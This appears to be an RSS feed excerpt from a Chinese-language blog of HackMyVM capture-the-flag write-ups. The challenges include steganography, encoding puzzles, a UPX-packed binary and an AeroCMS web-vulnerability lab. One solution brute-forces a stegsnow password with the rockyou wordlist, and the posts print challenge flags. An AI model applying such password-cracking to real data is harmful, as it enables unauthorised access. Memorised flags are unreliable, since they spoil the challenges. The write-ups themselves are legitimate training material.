zoV ElIfVI Aazl sXaXfX. qa YVTzVCEVI 2012, SlmIaXtAdz Xaf JalanClmd XddlyAXzV FXIIVzz FIlva, Ualva glI dTVXUAaO zl CVfAX la EVoXtg lg zoV OIlmT, vXd XIIVdzVf olmId XgzVI TldzAaO X iAfVl zoXz XTTVXIVf zl zoIVXzVa uFq XOVazd vAzo TondAyXt iAltVayV. FIlva vXd dmEdVpmVaztn yoXIOVf vAzo 17 lggVadVd, AaytmfAaO TmEtAdoAaO TVIdlaXt yIVfAz yXIf AaglICXzAla gIlC zoV YzIXzglI oXyU.   
```

我只能说ai秒了

![image-20250722215322625](https://7r1umphk.github.io/image/20250722215322722.webp)

```
HMV{is_the_best_website_for_vulnerable_virtual_machines}
```

。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20071.html</guid><pubDate>Tue, 22 Jul 2025 15:10:27 +0000</pubDate></item><item><title>Challenge 070</title><link>https://7r1UMPHK.github.io/post/Challenge%20070.html</link><description>![image-20250722212408911](https://7r1umphk.github.io/image/20250722212409115.webp)

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z x 070.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 308448 bytes (302 KiB)

Extracting archive: 070.zip
--
Path = 070.zip
Type = zip
Physical Size = 308448

Everything is Ok

Files: 2
Size:       316108
Compressed: 308448
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -al
总计 631
drwxr-xr-x 1 kali kali   4096  7月22日 09:39 .
drwxr-xr-x 1 kali kali  16384  7月22日 00:08 ..
-rwxr-xr-x 1 kali kali 308448  7月22日 09:39 070.zip
-rwxr-xr-x 1 kali kali   6600 2024年 3月14日 hmv005
-rwxr-xr-x 1 kali kali 309508 2024年 3月14日 hmv005-static
                                     
```

尝试反编译一下

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ strings hmv005                            
UPX!
tdoP7
[oQ7
/lib64
nux-x86-
so.2
puts
free
strlen
mall
art_
cxa_f    iz.
6sLIBC_2.34
5/ITM_deZgiE
CWneTabeK`
]_*(
PTE1
u+UH
_GLOBAL_OFFSET_TABLE_
frame_
dummy
 Lost in OSINT 
$/PP
;*3$'?}
USQRH
W^YH
PROT_EXEC|PROT_WRITE failed.
_j&lt;X
$Info: This file is packed with the UPX executable packer http://upx.sf.net $
$Id: UPX 4.22 Copyright (C) 1996-2024 the UPX Team. All Rights Reserved. $
_RPWQM)
j'AZR^j
PZS^
/proc/self/exe
IuDSWH
s2V^
XAVAWPH
YT_j
AY^_
D$ [I
UPX!u
slIT$}
}aw993u
([]A\A]
I[8k
(L      '
tL      n
+xHf
p(E1[$1
fFj9
~*'|]
I5(Ag
@bQs
 k1(
=(I[u
A^A_)
m@S r6
ck5?
JAPC
JG=,1
SRVW
RY?WVj,4
GCC: (Debian 13.2.0-
/|G`
 x!va
0G]/
aw7L
Scrt1.o
_tag
stuff.c
deregi
_clones)do_g
bal     tor
s9ux5omple)d.0!
_fin`array_entry
vme ummy2
)t*hmv005
'Fwyk
RAME_END
DYNIC
vGNU
GLOBA
L_OFFSET_TABL
see@
BC_2
59libc_
nrmay
ITM_
T)Xroo
se1chH
dF_uod
cj(3bssNc
~KeySav
imP_
oize5
6.symnb
h        Np
o.gnu.prop
build-id
K       dynb
la(so#
.ehthd
Qd5G3
=,?8
'epa
.P/^
 0o9l
UPX!
UPX!
```

输出中多次出现了 UPX! 以及 $Info: This file is packed with the UPX executable packer http://upx.sf.net $ 的字样。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20070.html</guid><pubDate>Tue, 22 Jul 2025 15:10:17 +0000</pubDate></item><item><title>Challenge 069</title><link>https://7r1UMPHK.github.io/post/Challenge%20069.html</link><description>![image-20250722210655654](https://7r1umphk.github.io/image/20250722210710989.webp)

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z x 069.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 198 bytes (1 KiB)

Extracting archive: 069.zip
--
Path = 069.zip
Type = zip
Physical Size = 198

Everything is Ok

Size:       4
Compressed: 198
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -al
总计 21
drwxr-xr-x 1 kali kali  4096  7月22日 09:07 .
drwxr-xr-x 1 kali kali 16384  7月22日 00:08 ..
-rwxr-xr-x 1 kali kali     4 2024年 4月19日 069.bin
-rwxr-xr-x 1 kali kali   198  7月22日 09:07 069.zip
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ find 069.bin                                             
069.bin
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ strings 069.bin                           
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat 069.bin
�                                                                                               
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ xxd 069.bin
00000000: 8d08 13b0                                ....
```

我去，这么少东西

```
8d0813b0
HM@....@
HM@HACK@
```

。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20069.html</guid><pubDate>Tue, 22 Jul 2025 15:10:04 +0000</pubDate></item><item><title>Challenge 068</title><link>https://7r1UMPHK.github.io/post/Challenge%20068.html</link><description>![image-20250722102128231](https://7r1UMPHK.github.io/image/static/image/20250722103206029.webp)
# **解题步骤**

## **第一步：文件分析与异常发现**

1.  **解压文件**: 挑战始于一个 `068.zip` 压缩包，解压后得到一个文本文件 `068.txt`。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20068.html</guid><pubDate>Tue, 22 Jul 2025 08:33:03 +0000</pubDate></item><item><title>Challenge 067</title><link>https://7r1UMPHK.github.io/post/Challenge%20067.html</link><description>![image-20250722102128231](https://7r1UMPHK.github.io/image/20250722102128477.webp)

# **解题步骤**

## **第一步：文件提取与初步分析**

挑战从一个名为 `067.zip` 的压缩包开始。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20067.html</guid><pubDate>Tue, 22 Jul 2025 08:32:49 +0000</pubDate></item><item><title>Challenge 066</title><link>https://7r1UMPHK.github.io/post/Challenge%20066.html</link><description>![image-20250722102055575](https://7r1UMPHK.github.io/image/20250722102055801.webp)

# **解题步骤**

## **第一步：Base64 解码**

题目给出的初始线索是一串 Base64 编码的字符串。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20066.html</guid><pubDate>Tue, 22 Jul 2025 08:32:36 +0000</pubDate></item><item><title>内部_Change</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Change.html</link><description>

![image](https://7r1UMPHK.github.io/image/20250721221556384.webp)

# 一、信息收集

# 1. 主机发现

首先，在内网环境中使用 `arp-scan` 工具扫描本地网络，以发现存活的主机。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Change.html</guid><pubDate>Mon, 21 Jul 2025 15:04:41 +0000</pubDate></item><item><title>Challenge 065</title><link>https://7r1UMPHK.github.io/post/Challenge%20065.html</link><description># 065

## material 材料

### badge.png 徽章

![image-20250720175756421](https://7r1umphk.github.io/image/20250721120816690.webp)

X特工

网络部门

暂时google没有找到出处

yandex找到相似的youtube用户
https://www.youtube.com/@botaniker6644/videos 主题csgo 无用

### files.zip 文件

解压出files文件夹

### letter.txt 信

```
Good morning AgentX,

Before continuing with the new mission, you need to read the welcome message from our best agent WhiteRabbit.

&gt; Distinguished AgentX,
&gt; 
&gt; 
&gt; It is with great pleasure that I extend to you a warm welcome to our esteemed hacking group. Your inclusion enhances our collective capabilities, and we anticipate your contributions with enthusiasm. As we navigate the intricacies of cyberspace, I am confident that your skills will prove invaluable to our endeavors.
&gt; 
&gt; May our collaboration be marked by professionalism, mutual respect, and shared success. We look forward to your insights and expertise as we embark on various undertakings together.
&gt; 
&gt; Once again, welcome to the team.
&gt; 
&gt; Sincerely,
&gt; WhiteRabbit
&gt; 

# MISSION

Now let’s talk, about your mission:
You will need to search all possible information about the target and store them for the future. You will later receive from another team member a encrypted message that was left by him before vanishing. We absolutely need your capabilities to be able to understand what he is trying to do.
You will need a special key obtained in (https://hackmyvm.eu/challenges/challenge.php?c=052) to be able to see the to start with the mission.

Best of luck for you AgentX,

Sh4dowExe
```

扒拉到了作者X

https://x.com/Sh4dow3x3

#### 翻译

```
AgentX，早上好！

在继续执行新任务之前，请阅读我们最棒的特工“白兔”（WhiteRabbit）的欢迎词。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20065.html</guid><pubDate>Mon, 21 Jul 2025 04:12:09 +0000</pubDate></item><item><title>Challenge 064</title><link>https://7r1UMPHK.github.io/post/Challenge%20064.html</link><description>害，星期日还要看备考视频，放松一下

![image-20250720151939191](https://7r1UMPHK.github.io/image/20250720151939414.webp)

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z x 064.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 337165 bytes (330 KiB)

Extracting archive: 064.zip
--
Path = 064.zip
Type = zip
Physical Size = 337165

Everything is Ok

Files: 2
Size:       337065
Compressed: 337165
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -al        
总计 675
drwxr-xr-x 1 kali kali   4096  7月20日 03:20 .
drwxr-xr-x 1 kali kali  12288  7月20日 03:14 ..
-rwxr-xr-x 1 kali kali 337165  7月20日 03:19 064.zip
-rwxr-xr-x 1 kali kali 336604 2024年 1月17日 challenge.png
-rwxr-xr-x 1 kali kali    461 2024年 1月18日 decodesteg.py
                                  
```

![challenge](https://7r1UMPHK.github.io/image/20250720152043954.webp)

isEven(R+G+B)提示flag 藏在“RGB 三通道之和为偶数”的像素里

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat decodesteg.py 
from PIL import Image

im = Image.open('challenge.png')
pixelMap = im.load()
img = Image.new( im.mode, im.size)
pixelsNew = img.load()

for i in range(img.size[0]):
    for j in range(img.size[1]):
        RGB = im.getpixel((i,j))
        R,G,B = RGB
        #

        #
        pixelsNew[i,j] = (R,G,B)
im.close()

img.show()
img.save('flag.png') 
img.close()

# Can you find the flag hidden in the image?
# may need to 'pip3 install pillow' if not installed
                                                  
```

填代码

```
from PIL import Image

im = Image.open('challenge.png')
pixelMap = im.load()
img = Image.new(im.mode, im.size)
pixelsNew = img.load()

for i in range(img.size[0]):
    for j in range(img.size[1]):
        R, G, B = im.getpixel((i, j))
        if (R + G + B) % 2 == 0:
            pixelsNew[i, j] = (255, 255, 255)  
        else:
            pixelsNew[i, j] = (0, 0, 0)        

im.close()
img.show()
img.save('flag.png')
img.close()
```

![flag](https://7r1UMPHK.github.io/image/20250720152504984.webp)

```
HMV{Play_with_Pixels}
```

。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20064.html</guid><pubDate>Mon, 21 Jul 2025 04:11:52 +0000</pubDate></item><item><title>内部_Rabb1t</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Rabb1t.html</link><description>![image-20250719210601338](https://7r1UMPHK.github.io/image/20250719210613707.webp)

这靶机名字起的好，哈哈哈

# 一、信息收集与服务探测

## 1. 主机发现

首先，使用 `arp-scan` 在本地网络中发现目标主机的IP地址。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Rabb1t.html</guid><pubDate>Sun, 20 Jul 2025 06:33:40 +0000</pubDate></item><item><title>Challenge 063</title><link>https://7r1UMPHK.github.io/post/Challenge%20063.html</link><description>![image-20250718221751985](https://7r1umphk.github.io/image/20250718221752208.webp)

https://hackmyvm.eu/challenges/challenge.php?c=063

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -la        
总计 4655
drwxr-xr-x 1 kali kali    4096  7月18日 10:10 .
drwxr-xr-x 1 kali kali    8192  7月17日 23:37 ..
-rwxr-xr-x 1 kali kali 2377257 2023年 1月10日 062.png
-rwxr-xr-x 1 kali kali 2375882  7月18日 10:10 062.zip
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -al 063.zip 
-rwxr-xr-x 1 kali kali 431  7月18日 10:18 063.zip
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z x 063.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 431 bytes (1 KiB)

Extracting archive: 063.zip
--
Path = 063.zip
Type = zip
Physical Size = 431

Everything is Ok

Size:       671
Compressed: 431
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -al        
总计 14
drwxr-xr-x 1 kali kali 4096  7月18日 10:18 .
drwxr-xr-x 1 kali kali 8192  7月17日 23:37 ..
-rwxr-xr-x 1 kali kali  671 2024年 1月24日 063.txt
-rwxr-xr-x 1 kali kali  431  7月18日 10:18 063.zip
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat 063.txt
In the script's silent dance, spaces weave,                              
A hidden language, easy to deceive.                                          
Between the lines, where eyes might stray,                            
The secret dwells in whitespace's play.                                
                                                                           
Embrace the gaps, where silence gleams,                                    
Decode the whispers in code's dreams.                                    
In every blank, a story told,                                              
For beginners bold, a mystery unfolds.                                      
                                                                            
                                                                           
                                                                            
           
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat -A 063.txt 
In the script's silent dance, spaces weave,^I   ^I  ^I       ^I $
A hidden language, easy to deceive.       ^I     ^I   ^I  ^I     $
Between the lines, where eyes might stray, ^I      ^I ^I      $
The secret dwells in whitespace's play.^I       ^I     ^I     ^I       $
^I    ^I   ^I^I      ^I  ^I  ^I       ^I ^I   $
Embrace the gaps, where silence gleams, ^I   ^I ^I      ^I   $
Decode the whispers in code's dreams. ^I  ^I      ^I  ^I       ^I $
In every blank, a story told, ^I  ^I     ^I   ^I ^I       ^I   $
For beginners bold, a mystery unfolds.   ^I     ^I  ^I  ^I    $
       ^I       ^I    ^I    ^I     ^I     ^I  ^I   ^I     ^I    $
  ^I      ^I^I      ^I ^I^I   ^I ^I   ^I   $
^I       ^I  ^I  ^I    ^I    ^I     ^I    ^I     ^I    $
  ^I   $
                            
```

对空白比较敏感

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ stegsnow 063.txt 
��r��=�^i��5�WO�H�M�R�pi��M+                                                                                                                                                                               
```

看样子有加密，去扒拉一个爆破
https://github.com/cyberpoul/StegsnowBruteForcer

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$git clone https://github.com/cyberpoul/StegsnowBruteForcer.git
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cd StegsnowBruteForcer
                                                                                       
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/StegsnowBruteForcer]
└─$ source ~/pythonvenv/bin/activate
                             
┌──(pythonvenv)─(kali㉿kali)-[/mnt/…/gx/x/tmp/StegsnowBruteForcer]
└─$ pip install -r requirements.txt

┌──(pythonvenv)─(kali㉿kali)-[/mnt/…/gx/x/tmp/StegsnowBruteForcer]
└─$ python stegsnowbruteforcer.py --file ../063.txt --wordlist /usr/share/wordlists/rockyou.txt --keyword HMV{ --output results.txt 

***********************************************************
*                                                         *
*         Stegsnow Password Brute-Force Attack            *
*                    made by Assa                         *
*     https://github.com/Assa228/StegsnowBruteForcer      *
*                                                         *
***********************************************************

  0%|                                | 480/14344392 [00:12&lt;23:06:27, 172.43it/s]
Keyword 'HMV{' found with the password: letmein
Here is the decoded message:
HMV{wh1t3_sp4c3_st3g_15_fu/\/}
  0%|                               | 6394/14344392 [00:19&lt;12:25:36, 320.50it/s]^C

```

。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20063.html</guid><pubDate>Fri, 18 Jul 2025 14:57:48 +0000</pubDate></item><item><title>Challenge 062</title><link>https://7r1UMPHK.github.io/post/Challenge%20062.html</link><description>![image-20250718220920924](https://7r1umphk.github.io/image/20250718220921171.webp)

https://hackmyvm.eu/challenges/challenge.php?c=062

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -la 062.zip 
-rwxr-xr-x 1 kali kali 2375882  7月18日 10:10 062.zip
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z x 062.zip     

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 2375882 bytes (2321 KiB)

Extracting archive: 062.zip
--
Path = 062.zip
Type = zip
Physical Size = 2375882

Everything is Ok

Size:       2377257
Compressed: 2375882
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -la        
总计 4655
drwxr-xr-x 1 kali kali    4096  7月18日 10:10 .
drwxr-xr-x 1 kali kali    8192  7月17日 23:37 ..
-rwxr-xr-x 1 kali kali 2377257 2023年 1月10日 062.png
-rwxr-xr-x 1 kali kali 2375882  7月18日 10:10 062.zip
                                     
```

![image-20250718221100328](https://7r1umphk.github.io/image/20250718221101047.webp)

现在看到飞机就烦，之前解那个机场那个到现在都没搞明白

看到有一个条码还是完整的，找个条码扫描，扫扫

https://www.1txm.com/barcodeDecode

![image-20250718221717097](https://7r1umphk.github.io/image/20250718221717466.webp)

```
HMV{1_l0v3_c0d3_128}
```

。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20062.html</guid><pubDate>Fri, 18 Jul 2025 14:57:36 +0000</pubDate></item><item><title>Challenge 061</title><link>https://7r1UMPHK.github.io/post/Challenge%20061.html</link><description>![image-20250718215535991](https://7r1umphk.github.io/image/20250718215536221.webp)

https://hackmyvm.eu/challenges/challenge.php?c=061

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -la 061.zip 
-rwxr-xr-x 1 kali kali 435  7月18日 09:55 061.zip
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z x 06*.zip

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 435 bytes (1 KiB)

Extracting archive: 061.zip
--
Path = 061.zip
Type = zip
Physical Size = 435

Everything is Ok

Size:       430
Compressed: 435
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -al        
总计 13
drwxr-xr-x 1 kali kali 4096  7月18日 09:56 .
drwxr-xr-x 1 kali kali 8192  7月17日 23:37 ..
-rwxr-xr-x 1 kali kali  430 2024年 1月24日 061.txt
-rwxr-xr-x 1 kali kali  435  7月18日 09:55 061.zip
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat 061.txt
UEsDBC0AAgAIALySN1jMnd4u//////////8BABQALQEAEAA4BQAAAAAAAHgAAAAAAAAArVPJDcAg
DFvJ3n+58mih5G6KhGQBVi7HAAmMsyEWciAh/ieP877xnnfIeBmfimfW4cZf/2HdL4z7S3hZXlUn
a3Og5v+KW9XXzY/ePGW8sp7s7Ve1Dq+vbG9P6WDse+yH4vwMf7byez5HU192dT3kl89+pdvfzb8A
UEsBAh4DLQACAAgAvJI3WMyd3i54AAAAOAUAAAEAAAAAAAAAAQAAAIARAAAAAC1QSwYGLAAAAAAA
AAAeAy0AAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAALwAAAAAAAACrAAAAAAAAAFBLBgcAAAAA2gAA
AAAAAAABAAAAUEsFBgAAAAABAAEALwAAAKsAAAAAAA==
                                    
```

https://gchq.github.io/CyberChef/

![image-20250718215743580](https://7r1umphk.github.io/image/20250718215743873.webp)

PKZIP压缩文件

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z x 061b.zip -oa           

┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -la a      
总计 6
-rwxr-xr-x 1 kali kali 1336 2024年 1月23日 -
drwxr-xr-x 1 kali kali    0  7月18日 10:01 .
drwxr-xr-x 1 kali kali 4096  7月18日 10:01 ..
```

神人

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat a/-                   
0011001000110010001100000011000001110100001100100011001000110001001100100111010000110001001100000011000000110001001100100111010000110001001100010011000100110010001100000111010000110001001100000011000000110000001100010111010000110010001100100011001000110010011101000011001000110010001100000011001001110100001100100011000000110000001100010111010000110001001100000011000100110001001100100111010000110001001100100011000100110001011101000011000100110000001100010011000100110010011101000011001000110010001100000011000001110100001100010011001000110001001100000111010000110010001100100011001000110010011101000011000100110010001100100011000001110100001100010011000000110001001100010011001001110100001100010011000000110000001100100011001001110100001100010011001000110001001100000111010000110001001100000011000000110001001100010111010000110001001100000011000100110001001100100111010000110010001100010011000100110001011101000011000100110001001100000011001000110000011101000011000100110010001100100011000101110100001100100011000100110001001100010111010000110010001100100011000100110000011101000011000100110010001100100011000001110100001100100011000100110001001100100111010000110001001100000011000100110001001100100111010000110001001100100011000100110001011101000011001000110000001100000011000101110100001100010011000100110001001100100011001001110100                                                         
```

![image-20250718220535012](https://7r1umphk.github.io/image/20250718220535314.webp)

解出一个三进制，t为分隔符

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat a.py 
s = '2200t2212t10012t11120t10001t2222t2202t2001t10112t1211t10112t2200t1210t2222t1220t10112t10022t1210t10011t10112t2111t11020t1221t2111t2210t1220t2112t10112t1211t2001t11122t'
nums = s.strip('t').split('t')
flag = ''.join(chr(int(n, 3)) for n in nums)
print(flag)
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ python3 $_               
HMV{RPJ7_1_H0P3_Y0U_Cr4CK3D_17}
                          
```

。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20061.html</guid><pubDate>Fri, 18 Jul 2025 14:57:26 +0000</pubDate></item><item><title>Challenge 060</title><link>https://7r1UMPHK.github.io/post/Challenge%20060.html</link><description>![image-20250718215028063](https://7r1umphk.github.io/image/20250718215056695.webp)

https://hackmyvm.eu/challenges/challenge.php?c=060

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -la 060.zip 
-rwxr-xr-x 1 kali kali 5795  7月18日 09:51 060.zip
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z x 060.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 5795 bytes (6 KiB)

Extracting archive: 060.zip
--
Path = 060.zip
Type = zip
Physical Size = 5795

Everything is Ok

Size:       23103
Compressed: 5795
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -la        
总计 1424
drwxr-xr-x 1 kali kali    4096  7月18日 09:51 .
drwxr-xr-x 1 kali kali    8192  7月17日 23:37 ..
...
-rwxr-xr-x 1 kali kali   23103 2024年 1月22日 060.txt
-rwxr-xr-x 1 kali kali    5795  7月18日 09:51 060.zip
...
    
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ head -n 10 060.txt
G90
G20
G17 G64 P0.001 M3 S3000
F5.00
G0 Z0.2500
G0 X0.1329 Y0.0000
G1 Z-0.0010 F0.10
G1 X0.1329 Y0.0000F5.00
G1 Y0.0946
G1 X0.0536
```

G-code 学机床的应该很熟，哈哈哈

https://ncviewer.com/

![image-20250718215438894](https://7r1umphk.github.io/image/20250718215439411.webp)

```
HMV{engraving_a_trophy_for_Kerszi}
```

。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20060.html</guid><pubDate>Fri, 18 Jul 2025 14:57:14 +0000</pubDate></item><item><title>Challenge 059</title><link>https://7r1UMPHK.github.io/post/Challenge%20059.html</link><description>![image-20250718211403641](https://7r1umphk.github.io/image/20250718211403851.webp)

https://hackmyvm.eu/challenges/challenge.php?c=059

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z x 059.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 1340043 bytes (1309 KiB)

Extracting archive: 059.zip
--
Path = 059.zip
Type = zip
Physical Size = 1340043
Comment = 67f1eeaca308318257ec4f222b4315741738d456

Everything is Ok

Folders: 22
Files: 120
Size:       3143617
Compressed: 1340043
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -al
总计 1395
drwxr-xr-x 1 kali kali    4096  7月18日 09:14 .
drwxr-xr-x 1 kali kali    8192  7月17日 23:37 ..
-rwxr-xr-x 1 kali kali   35450  7月18日 09:05 058.zip
-rwxr-xr-x 1 kali kali 1340043  7月18日 09:14 059.zip
-rwxr-xr-x 1 kali kali   35280 2023年12月28日 challenge.png
drwxr-xr-x 1 kali kali    4096 2024年 1月 4日 h1ker-main
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cd h1ker-main 
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/h1ker-main]
└─$ ls -al
总计 75
drwxr-xr-x 1 kali kali  4096 2024年 1月 4日 .
drwxr-xr-x 1 kali kali  4096  7月18日 09:14 ..
drwxr-xr-x 1 kali kali  4096 2024年 1月 4日 admin
-rwxr-xr-x 1 kali kali  8554 2024年 1月 4日 aerocms.sql
-rwxr-xr-x 1 kali kali  2411 2024年 1月 4日 author_posts.php
-rwxr-xr-x 1 kali kali   100 2024年 1月 4日 build_docker.sh
-rwxr-xr-x 1 kali kali  3203 2024年 1月 4日 category.php
drwxr-xr-x 1 kali kali     0 2024年 1月 4日 config
drwxr-xr-x 1 kali kali     0 2024年 1月 4日 css
-rwxr-xr-x 1 kali kali   324 2024年 1月 4日 Dockerfile
drwxr-xr-x 1 kali kali  4096 2024年 1月 4日 fonts
drwxr-xr-x 1 kali kali     0 2024年 1月 4日 images
drwxr-xr-x 1 kali kali  4096 2024年 1月 4日 includes
-rwxr-xr-x 1 kali kali  4421 2024年 1月 4日 index.php
drwxr-xr-x 1 kali kali     0 2024年 1月 4日 js
-rwxr-xr-x 1 kali kali 18092 2024年 1月 4日 LICENSE
-rwxr-xr-x 1 kali kali  7812 2024年 1月 4日 post.php
-rwxr-xr-x 1 kali kali  1306 2024年 1月 4日 README.md
-rwxr-xr-x 1 kali kali  3176 2024年 1月 4日 registration.php
-rwxr-xr-x 1 kali kali   369 2024年 1月 4日 run.sh
-rwxr-xr-x 1 kali kali  3039 2024年 1月 4日 search.php
                                                    
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/h1ker-main]
└─$ cat README.md                                        

# H1ker
&lt;p align=center&gt;
&lt;a target='_blank' href='LICENSE' title='License: MIT'&gt;&lt;img src='https://img.shields.io/badge/License-MIT-blue.svg'&gt;&lt;/a&gt;
&lt;a target='_blank' href='AeroCMS' title='AeroCMS'&gt;&lt;img src='https://img.shields.io/badge/cms-latest-purple'&gt;&lt;/a&gt;
&lt;/p&gt;

# AeroCMS
Aero / AeroCMS is a simple and easy to use CMS (Content Management System) designed to create fast and powerful web applications. Aero is built with OOP (Object Oriented Programming) PHP which is known for fast website loading speeds, [AeroCMS](https://github.com/MegaTKC/AeroCMS).


This is a web vulnerability challenge, try to find the flag.
This challenge requires docker.

### Manual Docker image build and run
1. Install [Docker](https://www.docker.com)
2. Build the image `docker build -t h1ker .`
3. Start the container with a port of your choice by replacing 1337 `docker run --name=h1ker -d -p 1337:80 h1ker`
4. The challenge can be found in http://localhost:1337/

### Automated run
Run the following bash script to build and run the challenge `./build_docker.sh`. The challenge can be found in http://localhost:1337/

## Delete challenge
Don't forget to delete both the container and the image of the challenge after you finish:
1. Delete container `docker rm h1ker -f`
2. Delete image `docker rmi h1ker`


Have fun !
       
```

&gt; # H1ker
&gt; &lt;p align=center&gt;
&gt; &lt;a target='_blank' href='LICENSE' title='许可证：MIT'&gt;&lt;img src='https://img.shields.io/badge/License-MIT-blue.svg'&gt;&lt;/a&gt;
&gt; &lt;a target='_blank' href='AeroCMS' title='AeroCMS'&gt;&lt;img src='https://img.shields.io/badge/cms-latest-purple'&gt;&lt;/a&gt;
&gt; &lt;/p&gt;
&gt;
&gt; # AeroCMS
